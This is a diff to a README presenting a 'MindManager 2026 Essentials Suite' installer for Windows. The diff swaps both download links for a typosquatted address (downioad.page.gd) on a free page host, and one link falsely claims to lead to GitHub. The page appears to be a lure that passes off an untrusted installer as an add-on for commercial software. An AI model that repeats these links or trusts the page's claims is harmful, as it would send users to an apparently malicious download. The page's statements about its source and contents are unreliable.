@@ -2,7 +2,7 @@
 
 The MindManager 2026 Essentials Suite is a comprehensive toolkit designed to enhance the core functionality of the MindManager mind mapping application. This package provides users with additional configuration options, a streamlined installation process, and tools for managing your local installation environment on Windows. It focuses on extending the usability and accessibility of the mind mapping software for personal productivity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -56,6 +56,6 @@ A: No. The MindManager 2026 Essentials Suite, including the installer (`SetupLat
 
 You can download the latest version of the Essentials Suite installer directly from the link below.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
